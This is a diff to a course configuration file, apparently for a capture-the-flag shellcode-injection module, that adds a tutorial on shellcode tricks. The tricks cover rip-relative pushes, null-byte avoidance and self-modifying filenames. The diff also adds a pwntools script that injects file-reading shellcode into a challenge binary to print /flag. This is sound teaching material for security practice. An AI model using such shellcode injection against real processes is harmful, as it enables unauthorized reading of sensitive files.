@@ -90,7 +90,154 @@ modules:
     module: shellcode-injection
   description: |
     For these series of challenges, you'll build on your knowledge of assembly to write shellcode!
-    
+    ## Funky Shellcode Tricks!
+
+    ### Pushing 64-bit immediates:
+
+    You can’t push a 64-bit immediate in AMD64 directly (i.e., there is no such instruction as `push 0x1122334455667788`), but you can push it *indirectly* using rip-relative addressing. Consider the following code:
+
+    ```
+    .global _start
+    .intel_syntax noprefix
+    _start:
+    # write "Hello!"
+    push [rip+our_string]
+    mov rdi, 1
+    mov rsi, rsp
+    mov rdx, 7
+    mov rax, 1
+    syscall
+
+    # exit
+    mov rax, 60
+    syscall
+
+    our_string:
+    .string "Hello!\n"
+    ```
+
+    The `push [rip+data]` in that sample will read the 8-byte string `Hello!\n\0` from later in the shellcode (the `our_string` label) and push it to the stack. It’s similar to pushing that value directly, just with an added (implicit) memory read.
+
+    ### Moving data without `mov`
+
+    You can move data between registers without the `mov` instruction, by using the stack as an intermediate. For example: `mov rax, rbx` can be approximated with `push rbx; pop rax`.
+
+    You might need to point other registers at the stack (for example, if you store filenames there). You can do that with `push rsp; pop rdx`. Now, `rdx` points at the top of the stack.
+
+    ### Avoiding Null bytes
+
+    Instructions which take immediate values will take varaible length  immediates depending upon the destination register, if the immediate  value which you are using is capable of being represented with fewer  bytes then, for many instructions, you will inevitably have null bytes  at the beginning of this integer in memory. You will need to use  different variants of the instruction by referencing smaller portions of the destination registers (al instead of rax).
+
+    Nullbytes will also occur when loading strings by default
+
+    Example: Avoiding Null Bytes in Filenames
+
+    The problem:
+
+    ```
+    lea rdi, [rip+filename]
+
+    filename:
+        .string "/flag"
+    ```
+
+    Assembling this will generate null bytes, as you can see here:
+
+    ```
+    00000000: 488d 3d00 0000 002f 666c 6167 00         H.=..../flag.
+    ```
+
+    So how do we get rid of the null bytes? We can modify our code while it’s running to inject the required null bytes:
+
+    ```
+    lea rdi, [rip+filename] ;load filename
+    add rdi, 5              ;add 5 to the pointer (this puts us at the first 'A')
+    xor eax, eax            ;clear out rax to use as a null byte
+    mov BYTE PTR [rdi], al  ;write the value of al (a null byte!) over the 'A'
+
+    filename:
+        .ascii "/flagAAAA"
+    ```
+
+    After assembling:
+
+    ```
+    00000000: 488d 3d08 0000 0048 83c7 0531 c088 072f  H.=....H...1.../
+    00000010: 666c 6167 4141 41                        flagAAA
+    ```
+
+    As you can see, this no longer has null bytes in it, but when you run it, ‘/flag’ will become null terminated!
+
+    # pwntools crash course
+
+    pwntools is a ctf/exploitation python library pre-installed in the challenge levels.
+
+    ### Shellcoding with pwntools
+
+    pwntools can be used to pass shellcode to a challenge similar to how this was done in previous modules. 
+
+    ```
+    from pwn import *
+
+    context.arch = "amd64"
+    context.log_level = "debug"
+
+    assembly = """
+    // store /flag
+    mov rbx, 0x67616c662f
+    push rbx
+    mov rdi, rsp
+
+    // Open
+    mov rax, 2
+    mov rsi, 0
+    mov rdx, 0
+    syscall
+
+    // Read
+    mov rdi, rax
+    mov rax, 0
+    mov rsi, rsp
+    mov rdx, 0x100
+    syscall
+
+    // Write
+    mov rax, 1
+    mov rdi, 1
+    syscall
+    """
+
+    # Create shellcode and store in file
+    shellcode = asm(assembly)
+    open("shellcode", "wb").write(shellcode)
+
+    # Start a process
+    proc = process("/challenge/babyshell_level1")
+
+    # Read until a specified output
+    targetstr = "Reading 0x1000 bytes from stdin."
+    print(proc.recvuntil(targetstr).decode())
+
+    # Pass shellcode to target process
+    proc.sendline(shellcode)
+
+    # Read everything from the target process
+    print(proc.recvall().decode('latin-1'))
+    ```
+
+    pwntools makes it easy to interact with a process.  This is  particularly useful when a challenge leaks (prints) an address that  later needs to be included in the shellcode.
+
+    Also note that the last line calls `proc.recvall()`.  This is an important step because it will wait for the process to  close the output pipe before it finishes reading. Using other  instructions in order to cleanup the final output gets messy quick as  you do not know how much to read. 
+
+    The process class has a number of useful functions to accomplish this.  Some examples include:
+
+    ```
+    process.send()
+    process.recv()
+    process.recvuntil()
+    ```
+
+    Full documentation can be found at https://docs.pwntools.com/en/stable/tubes.html
   challenges:
     - import:
         challenge: level-1
@@ -226,8 +373,6 @@ modules:
         challenge: level-6-1
     - import:
         challenge: level-7-0
-      description: |
-        Busy writing solutions by hand? Check out [this solution to one of the reverse engineering levels](https://static.pwn.college/workshops/dod-july-2022#babyrev-level8-scripting-demo) that implements the backward of the transformation in Python.
     - import:
         challenge: level-7-1
     - import:
